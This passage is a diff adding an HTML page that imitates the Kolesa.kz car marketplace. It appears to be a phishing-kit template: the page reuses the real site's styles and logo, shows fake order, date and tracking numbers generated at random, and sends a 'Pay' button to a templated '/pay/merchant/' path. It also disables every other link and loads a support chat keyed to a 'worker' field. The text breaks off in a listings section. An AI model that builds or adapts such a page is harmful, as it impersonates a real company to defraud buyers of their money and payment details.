@@ -1,0 +1,976 @@
+<!doctype html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KOLESA.KZ — Купить и продать авто в Казахстане</title>
+    
+    <!-- Original KOLESA.KZ styles -->
+    <link rel="stylesheet" type="text/css" href="//kolesa.kz/static/frontend/css/main-vendor.2cda89c38e.css">
+    <link rel="stylesheet" type="text/css" href="//kolesa.kz/static/frontend/css/main-payment.281af1b7ce.css">
+    <link rel="stylesheet" type="text/css" href="//kolesa.kz/static/frontend/css/main-common.895ab9643a.css">
+    <link rel="stylesheet" type="text/css" href="//kolesa.kz/static/frontend/css/main-tailwind.8cf898f2dc.css">
+    <link rel="stylesheet" type="text/css" href="//kolesa.kz/static/frontend/css/main-index.f19f390264.css">
+    <link rel="stylesheet" href="/kolesa-static/main-vendor.css">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="preload" href="https://kolesa.kz/static/frontend/fonts/OpenSans-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="https://kolesa.kz/static/frontend/fonts/OpenSans-Semibold.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+    <!-- New clean payment template styles -->
+    <style>
+        :root{
+          --bg: #ffffff;
+          --bg-soft: #f6f7fb;
+          --card: #ffffff;
+          --text: #0f172a;
+          --muted: #6b7280;
+          --border: #e5e7eb;
+          --primary: #0066cc;
+          --primary-600: #0052a3;
+          --success: #16a34a;
+          --warning: #f59e0b;
+          --warning-text: #b45309;
+          --radius-xl: 16px;
+          --radius-lg: 12px;
+          --radius-md: 10px;
+          --shadow-sm: 0 1px 2px rgba(0,0,0,.04);
+          --shadow-md: 0 2px 8px rgba(0,0,0,.06);
+          --gap: 16px;
+        }
+
+        /* Payment template section override */
+        .payment-template-section {
+          background: var(--card);
+          border: 1px solid var(--border);
+          border-radius: var(--radius-xl);
+          box-shadow: var(--shadow-md);
+          padding: 18px;
+          margin: 24px 0;
+          font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Inter, "Helvetica Neue", Arial;
+          color: var(--text);
+        }
+        
+        .payment-template-section .hero-head{
+          display: grid; grid-template-columns: 1fr auto; align-items: center; gap: 12px;
+        }
+
+        /* Animated status */
+        .payment-template-section .status{
+          position: relative;
+          display: inline-flex; align-items: center; gap: 8px; font-size: 12px; font-weight: 700;
+          border-radius: 999px; padding: 6px 10px;
+          color: var(--warning-text); background: #fffbeb; border: 1px solid #fde68a;
+          animation: statusGlowWarn 4s ease-in-out infinite;
+        }
+        
+        .payment-template-section .status .dot{
+          position: relative; width: 8px; height: 8px; border-radius: 999px;
+          background: var(--warning);
+        }
+        .payment-template-section .status .dot::after{
+          content:""; position:absolute; inset:-6px; border-radius:999px;
+          border: 2px solid rgba(245,158,11,.35);
+          animation: rippleWarn 2.4s ease-out infinite;
+        }
+
+        .payment-template-section h2{ margin: 6px 0 2px; font-size: 20px; letter-spacing: .2px; color: var(--text); }
+        .payment-template-section .sub{ margin: 0; color: var(--muted); font-size: 14px; }
+
+        .payment-template-section .btn-primary{
+          display: inline-flex; align-items: center; justify-content: center; gap: 10px;
+          background: var(--primary); color: #fff; border: 1px solid var(--primary-600);
+          border-radius: 12px; padding: 12px 16px; font-weight: 800; letter-spacing: .2px; cursor: pointer;
+          box-shadow: 0 1px 0 rgba(255,255,255,.5) inset, 0 2px 8px rgba(0,102,204,.22);
+          transition: filter .15s ease, transform .05s ease;
+          text-decoration: none;
+        }
+        .payment-template-section .btn-primary:hover{ filter: brightness(1.06) }
+        .payment-template-section .btn-primary:active{ transform: translateY(1px) }
+
+        /* Meta */
+        .payment-template-section .meta{
+          display: grid; grid-template-columns: repeat(3, minmax(0,1fr)); gap: 10px; margin-top: 14px;
+        }
+        .payment-template-section .meta .item{
+          border: 1px solid var(--border); border-radius: 10px; padding: 12px; background: #fff;
+          display: grid; align-content: start; min-height: 76px;
+        }
+        .payment-template-section .meta .label{ color: var(--muted); font-size: 12px; margin-bottom: 4px; }
+        .payment-template-section .meta .value{ font-weight: 700; word-break: break-word; }
+
+        /* Tracker */
+        .payment-template-section .tracker{
+          margin-top: 14px; padding: 14px; border-radius: 12px; border: 1px solid var(--border); background: #fff;
+        }
+        .payment-template-section .steps{
+          --cols: 4;
+          display: grid; grid-template-columns: repeat(var(--cols), 1fr); gap: 12px;
+        }
+        .payment-template-section .step{
+          display: grid; grid-template-columns: 18px 1fr; align-items: start; gap: 8px;
+          padding: 10px 8px; border-radius: 10px; background: #fff; border: 1px solid #f3f4f6;
+        }
+        .payment-template-section .step .dot{
+          position: relative; width: 12px; height: 12px; border-radius: 999px; border: 2px solid var(--border); background: #fff;
+          transform-origin: center;
+        }
+        .payment-template-section .step.done .dot{
+          border-color: var(--success); background: var(--success);
+          animation: pulseDot 2.8s ease-in-out infinite;
+        }
+        .payment-template-section .step.done .dot::after{
+          content:""; position:absolute; inset:-6px; border-radius:999px;
+          border: 2px solid rgba(22,163,74,.35);
+          animation: rippleSucc 2.8s ease-out infinite;
+        }
+        .payment-template-section .step.current .dot{
+          border-color: var(--primary); background: #fff;
+          box-shadow: 0 0 0 3px rgba(0,102,204,.18);
+          animation: pulseDot 1.6s ease-in-out infinite;
+        }
+        .payment-template-section .step.current .dot::after{
+          content:""; position:absolute; inset:-6px; border-radius:999px;
+          border: 2px solid rgba(0,102,204,.35);
+          animation: ripplePrim 1.8s ease-out infinite;
+        }
+        .payment-template-section .step .name{ font-weight: 700; font-size: 13px; }
+        .payment-template-section .step .time{ color: var(--muted); font-size: 12px; margin-top: 2px; }
+
+        /* Grid layout */
+        .payment-template-section .grid{
+          display: grid; grid-template-columns: 1.35fr .65fr; gap: var(--gap); margin-top: 14px;
+          align-items: start;
+        }
+
+        /* Cards */
+        .payment-template-section .card{
+          background: var(--card);
+          border: 1px solid var(--border);
+          border-radius: var(--radius-lg);
+          box-shadow: var(--shadow-sm);
+          padding: 16px;
+        }
+        .payment-template-section .title-sm{ margin: 0 0 10px; font-size: 16px; letter-spacing: .2px; }
+
+        /* Items */
+        .payment-template-section .items{
+          margin-top: 12px; border: 1px solid var(--border); border-radius: 12px; background: #fff;
+          overflow: hidden;
+        }
+        .payment-template-section table{ width: 100%; border-collapse: collapse; font-size: 14px; table-layout: fixed; }
+        .payment-template-section thead th{
+          text-align: left; padding: 10px 12px; color: var(--muted); font-weight: 700; letter-spacing: .2px;
+          border-bottom: 1px solid var(--border); background: #fafafa;
+        }
+        .payment-template-section tbody td{ padding: 12px; border-bottom: 1px solid var(--border); }
+        .payment-template-section tbody tr:hover td{ background: #fcfcfc; }
+        .payment-template-section .items table th:nth-child(4),
+        .payment-template-section .items table td:nth-child(4),
+        .payment-template-section .items table td.price{
+          text-align: right; white-space: nowrap;
+          font-variant-numeric: tabular-nums lining-nums; font-feature-settings: "tnum" 1, "lnum" 1;
+        }
+
+        /* Totals */
+        .payment-template-section .totals{
+          display: grid; grid-template-columns: 1fr auto; gap: 8px; margin-top: 12px; padding-top: 12px; border-top: 1px dashed var(--border);
+        }
+        .payment-template-section .totals .label{ color: var(--muted); }
+        .payment-template-section .totals .val{ font-weight: 700; }
+        .payment-template-section .totals .total{ font-size: 18px; }
+
+        /* Side column */
+        .payment-template-section .stack{ display: grid; gap: var(--gap); }
+        .payment-template-section .field{
+          display: grid; grid-template-columns: 110px 1fr; gap: 10px; padding: 10px 12px;
+          border: 1px dashed var(--border); border-radius: 10px; align-items: center; background: #fff;
+        }
+        .payment-template-section .field .label{ color: var(--muted); font-size: 12px; }
+        .payment-template-section .field .value{ font-weight: 700; word-break: break-word; }
+
+        /* Support chat */
+        .chatra--webkit {
+          position: fixed;
+          right: 20px;
+          bottom: 20px;
+          z-index: 2147483647;
+        }
+        .support-circle {
+          position: fixed;
+          right: 20px;
+          bottom: 20px;
+          width: 60px;
+          height: 60px;
+          background: var(--primary);
+          border-radius: 50%;
+          cursor: pointer;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          box-shadow: 0 4px 12px rgba(0,102,204,.3);
+          z-index: 2147483646;
+        }
+        .support-circle::after {
+          content: "💬";
+          font-size: 24px;
+        }
+
+        /* Mobile responsive */
+        @media (max-width: 960px){
+          .payment-template-section .grid{ grid-template-columns: 1fr; }
+          .payment-template-section .steps{ --cols: 2; }
+        }
+        @media (max-width: 640px){
+          .payment-template-section .meta{ grid-template-columns: 1fr 1fr; }
+          .payment-template-section .steps{ --cols: 1; }
+          .payment-template-section .btn-primary{ width: 100%; padding: 14px; }
+          .payment-template-section{ padding: 20px 16px; }
+        }
+        @media (max-width: 420px){
+          .payment-template-section .meta{ grid-template-columns: 1fr; }
+        }
+
+        /* Table -> cards on narrow screens */
+        @media (max-width: 560px){
+          .payment-template-section .items table{ display: block; }
+          .payment-template-section .items thead{ display: none; }
+          .payment-template-section .items tbody{ display: grid; gap: 0; }
+          .payment-template-section .items tbody tr{
+            display: grid; grid-template-columns: 1fr auto; gap: 8px 12px;
+            border-bottom: 1px solid var(--border); padding: 12px;
+          }
+          .payment-template-section .items tbody tr:last-child{ border-bottom: none; }
+          .payment-template-section .items tbody td{ display: block; padding: 0; border: 0; }
+          .payment-template-section .items tbody td[data-th]::before{
+            content: attr(data-th);
+            display: block; color: var(--muted); font-size: 12px; margin-bottom: 2px;
+          }
+          .payment-template-section .items tbody td:nth-child(1){ grid-column: 1; }
+          .payment-template-section .items tbody td:nth-child(2){ grid-column: 1; }
+          .payment-template-section .items tbody td:nth-child(3){ grid-column: 2; text-align: right; }
+          .payment-template-section .items tbody td:nth-child(4){ grid-column: 2; text-align: right; }
+          .payment-template-section .items tbody td:nth-child(3)::before,
+          .payment-template-section .items tbody td:nth-child(4)::before{ text-align: right; display: block; }
+        }
+
+        /* Keyframes */
+        @keyframes pulseDot {
+          0%,100% { transform: scale(1) }
+          50%     { transform: scale(1.12) }
+        }
+        @keyframes rippleSucc {
+          0%   { transform: scale(.8); opacity: .6 }
+          70%  { transform: scale(2.1); opacity: 0 }
+          100% { opacity: 0 }
+        }
+        @keyframes ripplePrim {
+          0%   { transform: scale(.8); opacity: .6 }
+          70%  { transform: scale(2.0); opacity: 0 }
+          100% { opacity: 0 }
+        }
+        @keyframes statusGlowWarn {
+          0%,100% { box-shadow: 0 0 0 0 rgba(245,158,11,0) }
+          50%     { box-shadow: 0 0 0 6px rgba(245,158,11,.10) }
+        }
+        @keyframes rippleWarn {
+          0%   { transform: scale(.8); opacity: .6 }
+          70%  { transform: scale(2.1); opacity: 0 }
+          100% { opacity: 0 }
+        }
+    </style>
+    
+    <script>
+        // Функции для работы с localStorage
+        function getStoredData(key, fallbackGenerator) {
+            let data = localStorage.getItem(key);
+            if (!data) {
+                data = fallbackGenerator();
+                localStorage.setItem(key, data);
+            }
+            return data;
+        }
+        
+        function getOrderNumber() {
+            return getStoredData('orderNumber', () => {
+                const now = new Date();
+                const year = now.getFullYear();
+                const random = Math.floor(Math.random() * 900000) + 100000;
+                return `KLS-${year}-${random}`;
+            });
+        }
+        
+        function getCreateDate() {
+            return getStoredData('createDate', () => {
+                const now = new Date();
+                return now.toLocaleString('ru-RU', {
+                    day: '2-digit',
+                    month: '2-digit', 
+                    year: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    timeZone: 'Asia/Almaty'
+                }) + ' ALMT';
+            });
+        }
+        
+        function getTrackingNumber() {
+            return getStoredData('trackingNumber', () => {
+                const random = Math.floor(Math.random() * 9000) + 1000;
+                const random2 = Math.floor(Math.random() * 9000) + 1000;
+                return `TRK-${random}-${random2}`;
+            });
+        }
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const orderNumbers = document.querySelectorAll('.order-number');
+            const orderNumber = getOrderNumber();
+            orderNumbers.forEach(el => el.textContent = orderNumber);
+            
+            const createDates = document.querySelectorAll('.create-date');
+            const createDate = getCreateDate();
+            createDates.forEach(el => el.textContent = createDate);
+            
+            const trackingElements = document.querySelectorAll('.tracking-number');
+            const trackingNumber = getTrackingNumber();
+            trackingElements.forEach(el => el.textContent = trackingNumber);
+        });
+
+        function openSupport() {
+            document.querySelector('.support-circle').style.display = 'none';
+            document.querySelector('#chatra').style.display = 'block';
+        }
+
+        function goToPayment() {
+            window.location.href = '/pay/merchant/' + "{{item.id}}";
+        }
+        
+        // Disable all external links
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelectorAll('a[href]').forEach(link => {
+                if (link.href && !link.href.includes('#') && !link.classList.contains('btn-primary')) {
+                    link.href = '#';
+                    link.onclick = function(e) {
+                        e.preventDefault();
+                        return false;
+                    };
+                }
+            });
+        });
+    </script>
+</head>
+<body class="">
+    <!-- Support chat -->
+    <div id="support">
+        <script type="text/javascript">
+            if ("{{worker.supportType}}" && "{{worker.supportType}}" !== "") {
+                if ("{{worker.supportType}}" === "bot") {
+                    document.querySelector('#support').innerHTML += `
+                        <div class="chatra--webkit chatra--style-round chatra--side-bottom chatra--pos-right chatra--visible chatra--expanded chatra--fast-toggle"
+                             id="chatra" data-turbolinks-permanent=""
+                             style="width: 380px; height: 600px; transform: none; z-index: 2147483647; display: none;">
+                          <div id="chatra__iframe-wrapper">
+                            <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Чат поддержки"
+                                    allow="autoplay" src="/style/support/index.html?id={{item.id}}"
+                                    style="width: 380px; height: 600px; position: absolute;"></iframe>
+                          </div>
+                        </div>
+                        <div class="support-circle" onclick="openSupport()"></div>
+                    `;
+                } else {
+                    var _smartsupp = _smartsupp || {};
+                    _smartsupp.key = '{{worker.supportType}}';
+                    window.smartsupp||(function(d) {
+                        var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+                        s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+                        c.type='text/javascript';c.charset='utf-8';c.async=true;
+                        c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+                    })(document);
+                }
+            }
+        </script>
+    </div>
+
+    <div class="layout">
+        <div class="layout__content">
+            <header>
+                <div class="layout__secondary-header">
+                    <div class="ui-container">
+                        <div class="secondary-header" data-test="secondary-header">
+                            <ul class="corp-projects">
+                                <li>
+                                    <span class="corp-projects__title corp-projects__link--active">
+                                        Kolesa.kz
+                                    </span>
+                                </li>
+                                <li>
+                                    <a class="corp-projects__title corp-projects__link" href="#">
+                                        Krisha.kz
+                                    </a>
+                                </li>
+                            </ul>
+                            <ul class="site-menu">
+                                <li class="site-menu__item">
+                                    <button class="site-menu__link site-menu__link--accent">
+                                        Для бизнеса
+                                        <span class="tfi-chevron-down-small"></span>
+                                    </button>
+                                </li>
+                                <li class="site-menu__item">
+                                    <a class="site-menu__link" href="#">
+                                        Kolesa Гид
+                                    </a>
+                                </li>
+                                <li class="site-menu__item">
+                                    <button class="locale-dropdown">
+                                        RU
+                                        <span class="tfi-chevron-down-small"></span>
+                                    </button>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="layout__primary-header">
+                    <div class="ui-container">
+                        <div class="js__header-menu">
+                            <div class="primary-header" data-test="primary-header">
+                                <div class="primary-header__wrap">
+                                    <div class="primary-header__logo">
+                                        <div class="main-logo">
+                                            <img src="//kolesa.kz/static/frontend/images/kolesa-logo-new.svg" width="162" alt="Колеса">
+                                        </div>
+                                    </div>
+                                    <div class="primary-header__user-menu"></div>
+                                </div>
+                                <div class="primary-header__add-a">
+                                    <div></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="layout__categories-menu">
+                    <div class="ui-container">
+                        <ul class="categories-menu" data-test="categories-menu">
+                            <li>
+                                <a class="categories-menu__link isSelected" href="#">
+                                    <span class="categories-menu__icon tfi-cars-fill"></span>Машины
+                                </a>
+                            </li>
+                            <li>
+                                <a class="categories-menu__link" href="#">
+                                    <span class="categories-menu__icon tfi-cars-verified withAccent"></span>Авто от Kolesa.kz
+                                </a>
+                            </li>
+                            <li>
+                                <a class="categories-menu__link js__new-auto" href="#">
+                                    <span class="categories-menu__icon tfi-cars-wash"></span>Новые авто
+                                </a>
+                            </li>
+                            <li>
+                                <a class="categories-menu__link" href="#">
+                                    <span class="categories-menu__icon tfi-parts"></span>Запчасти
+                                </a>
+                            </li>
+                            <li>
+                                <a class="categories-menu__link" href="#">
+                                    <span class="categories-menu__icon tfi-services"></span>Ремонт и услуги
+                                </a>
+                            </li>
+                            <li>
+                                <a class="categories-menu__link" href="#">
+                                    <span class="categories-menu__icon tfi-truck"></span>Коммерческие
+                                </a>
+                            </li>
+                            <li class="categories-menu__item">
+                                <a class="categories-menu__link" href="#">
+                                    <span class="tfi-reading"></span>
+                                    Почитать
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </header>
+
+            <main>
+                <div class="container">
+                    <div class="row">
+                        <div class="col-sm-12">
+                            <section class="hot-big">
+                                <!-- NEW CLEAN PAYMENT TEMPLATE -->
+                                <section class="payment-template-section" aria-labelledby="order-title">
+                                    <div class="hero-head">
+                                        <div>
+                                            <span class="status" role="status" aria-live="polite">
+                                                <span class="dot" aria-hidden="true"></span>
+                                                К оплате
+                                            </span>
+                                            <h2 id="order-title">Заказ № <span class="order-number">KLS-2025-001124</span></h2>
+                                            <p class="sub">Проверьте детали покупки и оплатите заказ. После оплаты мы свяжемся с продавцом.</p>
+                                        </div>
+                                        <button class="btn-primary" onclick="goToPayment()" aria-label="Оплатить заказ">
+                                            Оплатить {{formattedPrice}}
+                                        </button>
+                                    </div>
+
+                                    <div class="meta" role="list">
+                                        <div class="item" role="listitem">
+                                            <div class="label">Создан</div>
+                                            <div class="value create-date">28.09.2025, 20:51 ALMT</div>
+                                        </div>
+                                        <div class="item" role="listitem">
+                                            <div class="label">Статус</div>
+                                            <div class="value">Ожидает оплаты</div>
+                                        </div>
+                                        <div class="item" role="listitem">
+                                            <div class="label">К оплате</div>
+                                            <div class="value">{{formattedPrice}}</div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Трекер -->
+                                    <div class="tracker" aria-label="Трекер заказа">
+                                        <div class="steps">
+                                            <div class="step done">
+                                                <div class="dot" aria-hidden="true"></div>
+                                                <div>
+                                                    <div class="name">Объявление найдено</div>
+                                                    <div class="time create-date">28.09.2025, 19:15</div>
+                                                </div>
+                                            </div>
+                                            <div class="step done">
+                                                <div class="dot" aria-hidden="true"></div>
+                                                <div>
+                                                    <div class="name">Заказ создан</div>
+                                                    <div class="time create-date">28.09.2025, 19:17</div>
+                                                </div>
+                                            </div>
+                                            <div class="step current">
+                                                <div class="dot" aria-hidden="true"></div>
+                                                <div>
+                                                    <div class="name">Ожидает оплаты</div>
+                                                    <div class="time">Перейдите к оплате</div>
+                                                </div>
+                                            </div>
+                                            <div class="step">
+                                                <div class="dot" aria-hidden="true"></div>
+                                                <div>
+                                                    <div class="name">Связь с продавцом</div>
+                                                    <div class="time">После оплаты</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="grid">
+                                        <div class="card" aria-labelledby="items-title">
+                                            <h3 id="items-title" class="title-sm">Содержимое заказа</h3>
+                                            <div class="items">
+                                                <table role="table" aria-label="Товары">
+                                                    <thead>
+                                                        <tr role="row">
+                                                            <th role="columnheader" scope="col">Товар</th>
+                                                            <th role="columnheader" scope="col">Артикул</th>
+                                                            <th role="columnheader" scope="col">Кол-во</th>
+                                                            <th role="columnheader" scope="col">Цена</th>
+                                                        </tr>
+                                                    </thead>
+                                                    <tbody>
+                                                        <tr role="row">
+                                                            <td role="cell" data-th="Товар"><strong>{{item.title}}</strong></td>
+                                                            <td role="cell" data-th="Артикул">{{item.id}}</td>
+                                                            <td role="cell" data-th="Кол-во">1</td>
+                                                            <td role="cell" class="price" data-th="Цена">{{formattedPrice}}</td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+
+                                            <div class="totals" aria-label="Итог">
+                                                <div class="label total">Итого к оплате</div>
+                                                <div class="val total">{{formattedPrice}}</div>
+                                            </div>
+
+                                            <p style="margin:10px 0 0; color: var(--muted); font-size: 13px">
+                                                Нажмите «Оплатить», чтобы перейти к защищённой странице платежа.
+                                            </p>
+                                        </div>
+
+                                        <div class="stack">
+                                            <div class="card" aria-labelledby="receiver-title">
+                                                <h3 id="receiver-title" class="title-sm">Получатель</h3>
+                                                <div class="field">
+                                                    <div class="label">Имя</div>
+                                                    <div class="value">{{receiver.name}}</div>
+                                                </div>
+                                                <div class="field">
+                                                    <div class="label">Телефон</div>
+                                                    <div class="value">{{receiver.phone}}</div>
+                                                </div>
+                                                <div class="field">
+                                                    <div class="label">Адрес</div>
+                                                    <div class="value">{{receiver.address}}</div>
+                                                </div>
+                                            </div>
+
+                                            <div class="card" aria-labelledby="delivery-title">
+                                                <h3 id="delivery-title" class="title-sm">Доставка</h3>
+                                                <div class="field">
+                                                    <div class="label">Трек-номер</div>
+                                                    <div class="value tracking-number">TRK-9988-5544</div>
+                                                </div>
+                                                <div class="field">
+                                                    <div class="label">Номер заказа</div>
+                                                    <div class="value order-number">KLS-2025-001124</div>
+                                                </div>
+                                                <div class="field">
+                                                    <div class="label">Статус</div>
+                                                    <div class="value">Готов к отправке</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </section>
+                                <!-- END CLEAN PAYMENT TEMPLATE -->
+                                
+                                <div class="row">
+                                    <div class="hot-header clearfix">
+                                        <div class="col-sm-12 col-lg-3"></div>
+                                    </div>
+                                </div>
+                            </section>
+                            
+                            <section class="add-new" data-test="add-new">
+                                <p class="add-new-info">
+                                    <span>Всего на сайте 1 076 180 объявлений,</span>
+                                    <span>из них 7 524 объявления подано сегодня.</span>
+                                </p>
+                            </section>
+
+                            <section class="main-content">
+                                <div class="row">
+                                    <section class="col-sm-8 content-left">
+                                        <section class="kolesa-app-promo" data-test="kolesa-app-promo">
+                                            <div class="app-promo">
+                                                <div class="app-promo__qr-container">
+                                                    <img class="app-promo__qr" data-test="app-promo-qr" src="//kolesa.kz/static/frontend/images/promo/app/qr.svg" alt="Kolesa QR" width="112" height="112">
+                                                </div>
+                                                <div class="app-promo__content">
+                                                    <h3 class="app-promo__title" data-test="app-promo-title">Все возможности внутри приложения</h3>
+                                                    <p class="app-promo__text" data-test="app-promo-text">Сканируйте, чтобы установить</p>
+                                                </div>
+                                                <img class="app-promo__phone" src="//kolesa.kz/static/frontend/images/promo/app/ru/phone.png?2" alt="Мобильное приложение Kolesa" width="219" height="234">
+                                            </div>
+                                        </section>
+                                        
+                                        <section class="cars-block" data-test="cars-block">
+                                            <div class="section-links">
+                                                <div class="links-block-header clearfix arrow-show">
+                                                    <h2 class="header-links">Выбор автомобиля по марке</h2>
+                                                    <span class="show-all-legacy arrow-link js__show-all-legacy">
+                                                        <span>Все марки</span>
+                                                        <i class="icon icon-arrow-down-blue"></i>
+                                                    </span>
+                                                </div>
+                                                
+                                                <div class="block-links-list row">
+                                                    <ul class="col-sm-2">
+                                                        <li><a href="#">AITO</a>&nbsp;<small>44</small></li>
+                                                        <li><a href="#">Audi</a>&nbsp;<small>6699</small></li>
+                                                        <li><a href="#">Avatr</a>&nbsp;<small>42</small></li>
+                                                        <li><a href="#">BMW</a>&nbsp;<small>7231</small></li>
+                                                        <li><a href="#">BYD</a>&nbsp;<small>1030</small></li>
+                                                        <li><a href="#">Bentley</a>&nbsp;<small>65</small></li>
+                                                        <li><a href="#">Cadillac</a>&nbsp;<small>304</small></li>
+                                                        <li><a href="#">Changan</a>&nbsp;<small>1324</small></li>
+                                                        <li><a href="#">Chery</a>&nbsp;<small>809</small></li>
+                                                        <li><a href="#">Chevrolet</a>&nbsp;<small>5411</small></li>
+                                                        <li><a href="#">Chrysler</a>&nbsp;<small>183</small></li>
+                                                        <li><a href="#">Citroen</a>&nbsp;<small>68</small></li>
+                                                        <li><a href="#">Daewoo</a>&nbsp;<small>3575</small></li>
+                                                        <li><a href="#">Daihatsu</a>&nbsp;<small>37</small></li>
+                                                    </ul>
+                                                    <ul class="col-sm-2">
+                                                        <li><a href="#">Datsun</a>&nbsp;<small>84</small></li>
+                                                        <li><a href="#">Deepal</a>&nbsp;<small>668</small></li>
+                                                        <li><a href="#">Dodge</a>&nbsp;<small>264</small></li>
+                                                        <li><a href="#">DongFeng</a>&nbsp;<small>38</small></li>
+                                                        <li><a href="#">EXEED</a>&nbsp;<small>256</small></li>
+                                                        <li><a href="#">FAW</a>&nbsp;<small>254</small></li>
+                                                        <li><a href="#">Fiat</a>&nbsp;<small>61</small></li>
+                                                        <li><a href="#">Ford</a>&nbsp;<small>1556</small></li>
+                                                        <li><a href="#">GAC</a>&nbsp;<small>107</small></li>
+                                                        <li><a href="#">GMC</a>&nbsp;<small>34</small></li>
+                                                        <li><a href="#">Geely</a>&nbsp;<small>872</small></li>
+                                                        <li><a href="#">Genesis</a>&nbsp;<small>159</small></li>
+                                                        <li><a href="#">Great Wall</a>&nbsp;<small>109</small></li>
+                                                        <li><a href="#">Haval</a>&nbsp;<small>634</small></li>
+                                                    </ul>
+                                                    <ul class="col-sm-2">
+                                                        <li><a href="#">Honda</a>&nbsp;<small>2609</small></li>
+                                                        <li><a href="#">Hongqi</a>&nbsp;<small>278</small></li>
+                                                        <li><a href="#">Hummer</a>&nbsp;<small>110</small></li>
+                                                        <li><a href="#">Hyundai</a>&nbsp;<small>14032</small></li>
+                                                        <li><a href="#">Infiniti</a>&nbsp;<small>729</small></li>
+                                                        <li><a href="#">Isuzu</a>&nbsp;<small>75</small></li>
+                                                        <li><a href="#">JAC</a>&nbsp;<small>831</small></li>
+                                                        <li><a href="#">Jaecoo</a>&nbsp;<small>66</small></li>
+                                                        <li><a href="#">Jaguar</a>&nbsp;<small>103</small></li>
+                                                        <li><a href="#">Jeep</a>&nbsp;<small>276</small></li>
+                                                        <li><a href="#">Jetour</a>&nbsp;<small>497</small></li>
+                                                        <li><a href="#">Kaiyi</a>&nbsp;<small>94</small></li>
+                                                        <li><a href="#">Kia</a>&nbsp;<small>8771</small></li>
+                                                        <li><a href="#">Land Rover</a>&nbsp;<small>1018</small></li>
+                                                    </ul>
+                                                    <ul class="col-sm-2">
+                                                        <li><a href="#">Lexus</a>&nbsp;<small>5801</small></li>
+                                                        <li><a href="#">Li</a>&nbsp;<small>600</small></li>
+                                                        <li><a href="#">Lifan</a>&nbsp;<small>318</small></li>
+                                                        <li><a href="#">Lincoln</a>&nbsp;<small>50</small></li>
+                                                        <li><a href="#">Lynk & Co</a>&nbsp;<small>39</small></li>
+                                                        <li><a href="#">MG</a>&nbsp;<small>79</small></li>
+                                                        <li><a href="#">Maserati</a>&nbsp;<small>32</small></li>
+                                                        <li><a href="#">Mazda</a>&nbsp;<small>3039</small></li>
+                                                        <li><a href="#">Mercedes-Benz</a>&nbsp;<small>12853</small></li>
+                                                        <li><a href="#">Mercedes-Maybach</a>&nbsp;<small>36</small></li>
+                                                        <li><a href="#">Mini</a>&nbsp;<small>88</small></li>
+                                                        <li><a href="#">Mitsubishi</a>&nbsp;<small>6130</small></li>
+                                                        <li><a href="#">Nissan</a>&nbsp;<small>7437</small></li>
+                                                        <li><a href="#">OMODA</a>&nbsp;<small>149</small></li>
+                                                    </ul>
+                                                    <ul class="col-sm-2">
+                                                        <li><a href="#">Opel</a>&nbsp;<small>3040</small></li>
+                                                        <li><a href="#">Peugeot</a>&nbsp;<small>369</small></li>
+                                                        <li><a href="#">Pontiac</a>&nbsp;<small>33</small></li>
+                                                        <li><a href="#">Porsche</a>&nbsp;<small>499</small></li>
+                                                        <li><a href="#">Ravon</a>&nbsp;<small>487</small></li>
+                                                        <li><a href="#">Renault</a>&nbsp;<small>1821</small></li>
+                                                        <li><a href="#">Renault Samsung</a>&nbsp;<small>48</small></li>
+                                                        <li><a href="#">Rox</a>&nbsp;<small>54</small></li>
+                                                        <li><a href="#">SEAT</a>&nbsp;<small>50</small></li>
+                                                        <li><a href="#">Skoda</a>&nbsp;<small>1245</small></li>
+                                                        <li><a href="#">SsangYong</a>&nbsp;<small>461</small></li>
+                                                        <li><a href="#">Subaru</a>&nbsp;<small>3511</small></li>
+                                                        <li><a href="#">Suzuki</a>&nbsp;<small>517</small></li>
+                                                        <li><a href="#">Tank</a>&nbsp;<small>223</small></li>
+                                                    </ul>
+                                                    <ul class="col-sm-2">
+                                                        <li><a href="#">Tesla</a>&nbsp;<small>164</small></li>
+                                                        <li><a href="#">Toyota</a>&nbsp;<small>32732</small></li>
+                                                        <li><a href="#">Volkswagen</a>&nbsp;<small>9445</small></li>
+                                                        <li><a href="#">Volvo</a>&nbsp;<small>230</small></li>
+                                                        <li><a href="#">Voyah</a>&nbsp;<small>83</small></li>
+                                                        <li><a href="#">Xiaomi</a>&nbsp;<small>32</small></li>
+                                                        <li><a href="#">Zeekr</a>&nbsp;<small>321</small></li>
+                                                        <li><a href="#">ВАЗ (Lada)</a>&nbsp;<small>19547</small></li>
+                                                        <li><a href="#">ГАЗ</a>&nbsp;<small>3951</small></li>
+                                                        <li><a href="#">ЗАЗ</a>&nbsp;<small>305</small></li>
+                                                        <li><a href="#">ИЖ</a>&nbsp;<small>77</small></li>
+                                                        <li><a href="#">Москвич</a>&nbsp;<small>105</small></li>
+                                                        <li><a href="#">Ретро-автомобили</a>&nbsp;<small>42</small></li>
+                                                        <li><a href="#">УАЗ</a>&nbsp;<small>874</small></li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </section>
+                                        
+                                        <!-- Hot car listings section with images -->
+                                        <section class="spare-parts-block section-links-block" data-test="spare-parts-block">
+                                            <a href="#" class="header-link"><span>Горячие предложения</span></a>
+                                            <p><small>Лучшие автомобили по выгодным ценам от проверенных продавцов</small></p>
+                                            
